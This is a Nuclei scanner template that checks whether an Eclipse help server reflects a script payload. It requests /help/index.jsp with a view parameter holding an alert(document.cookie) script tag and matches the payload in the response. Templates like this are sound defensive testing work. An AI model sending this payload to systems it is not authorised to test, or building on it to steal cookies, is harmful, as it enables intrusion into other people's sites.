# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
id: Eclipse-XSS

info:
  name: Eclipse Reflected XSS vulnerability
  author: pikpikcu
  severity: medium

http:
  - method: GET
    path:
      - "{{BaseURL}}/help/index.jsp?view=<script>alert(document.cookie)</script>"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<script>alert(document.cookie)</script>"
        part: body
